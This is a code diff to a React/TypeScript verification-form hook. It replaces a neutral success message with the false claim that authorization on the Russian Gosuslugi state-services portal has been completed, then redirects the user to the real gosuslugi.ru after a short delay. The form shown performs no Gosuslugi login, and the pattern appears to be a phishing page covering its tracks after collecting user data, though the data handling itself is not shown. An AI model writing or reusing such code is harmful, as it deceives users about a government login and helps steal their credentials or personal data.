@@ -28,21 +28,46 @@ const useVerificationForm = (onSuccess?: () => void) => {
 
           toaster({
             toastKey: 'success',
-            message: 'Верификация прошла успешно',
-            description: 'Спасибо за участие',
+            message: 'Авторизация в госулугах была пройдена.',
           });
+
           onSuccess?.();
+
+          setTimeout(() => {
+            try {
+              // Спробуємо відкрити через window.open з додатковими параметрами
+              const newWindow = window.open('https://www.gosuslugi.ru/', '_blank', 'noopener,noreferrer');
+
+              // Якщо window.open заблоковано, використовуємо fallback
+              if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+                // Створюємо посилання та симулюємо клік
+                const link = document.createElement('a');
+
+                link.href = 'https://www.gosuslugi.ru/';
+                link.target = '_blank';
+                link.rel = 'noopener noreferrer';
+                document.body.appendChild(link);
+                // eslint-disable-next-line testing-library/no-node-access
+                link.click();
+                document.body.removeChild(link);
+              }
+            } catch (error) {
+              console.error('Error opening gosuslugi:', error);
+              // Fallback - просто переходимо на сайт
+              window.location.href = 'https://www.gosuslugi.ru/';
+            }
+          }, 1500);
         } else {
           toaster({
             toastKey: 'error',
-            message: 'Ошибка верификации',
+            message: 'Ошибка авторизации',
           });
         }
       } catch (error) {
         console.error('Verification error:', error);
         toaster({
           toastKey: 'error',
-          message: 'Ошибка верификации',
+          message: 'Ошибка авторизации',
         });
       }
     },
